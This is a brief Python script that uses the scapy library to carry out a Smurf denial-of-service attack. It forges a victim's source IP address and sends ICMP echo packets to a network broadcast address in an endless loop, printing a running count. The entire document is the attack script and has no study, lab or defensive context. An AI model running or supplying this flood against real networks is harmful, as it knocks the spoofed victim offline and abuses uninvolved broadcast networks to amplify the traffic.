from scapy.all import *

def smurf(packet):
	sendp(packet)

eth = Ether()
ip = IP()
ip.src = '192.168.1.100'
ip.dst = '209.165.200.255'
icmp = ICMP()

m=0
while True:
	packet = eth/ip/icmp
	smurf(packet)
	print('Sending SMURF To %s'%ip.src)
	m = m + 1
	print(m)
